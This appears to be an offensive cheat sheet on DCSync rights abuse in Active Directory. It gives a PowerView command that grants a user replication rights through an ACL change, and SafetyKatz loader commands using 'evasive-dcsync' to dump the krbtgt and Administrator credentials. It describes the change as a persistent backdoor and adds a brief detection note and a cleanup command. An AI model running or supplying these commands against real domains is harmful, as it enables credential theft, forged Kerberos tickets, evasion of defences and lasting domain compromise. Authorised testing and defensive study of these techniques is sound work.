# DCSync Rights Abuse

Grant a controlled user DCSync rights via ACL modification, then perform DCSync without being a Domain Admin.

## Grant DCSync Rights
```powershell
# Import PowerView
Add-DomainObjectAcl -TargetIdentity 'DC=<domain>,DC=<tld>' -PrincipalIdentity <username> -Rights DCSync
```
This adds `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights.

## Perform DCSync
```
Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:<domain>\krbtgt" "exit"
Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:<domain>\Administrator" "exit"
```

## Notes
- Backdoor persists even if user is removed from privileged groups
- Detectable via SIEM: watch for `4662` events with `{1131f6aa...}` GUIDs from non-DC accounts
- Clean up: `Remove-DomainObjectAcl -TargetIdentity 'DC=...' -PrincipalIdentity <user> -Rights DCSync`
